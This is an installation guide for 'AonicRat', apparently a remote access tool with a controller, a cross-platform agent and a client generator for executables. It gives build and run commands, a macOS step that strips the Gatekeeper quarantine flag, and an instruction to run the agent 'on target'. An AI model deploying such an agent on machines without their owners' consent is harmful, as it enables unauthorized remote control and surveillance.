# Installation

## Requirements

| Component | OS | Java |
|-----------|-----|------|
| Controller (AonicRat) | Windows / Linux / macOS | Java 18+ |
| Agent (SimpleServer) | Windows / Linux / macOS | Java 11+ |
| Build | Any | Maven 3.x |

---

## Build Controller

```bash
cd AonicRat
mvn clean package
java -jar target/AonicRat-1.0.0-beta.jar
```

## Build Agent

```bash
cd AonicRat/SimpleServer
mvn clean package
```

Output: `SimpleServer/target/SimpleServer-1.0.0-beta.jar`

---

## Running the Agent

### Windows
```cmd
java -jar SimpleServer-1.0.0-beta.jar
```
Or use a generated `.exe` from the Client Generator.

### Linux
```bash
chmod +x agent-name
./agent-name
# or
java -jar SimpleServer-1.0.0-beta.jar
```

### macOS
```bash
unzip AgentName.app.zip
xattr -rd com.apple.quarantine AgentName.app
open AgentName.app
```

---

## Start the Server

1. Open controller → **Settings** tab
2. Set port (default `5555`)
3. Click **Start Server**
4. Run agent on target — it will appear in all device dropdowns
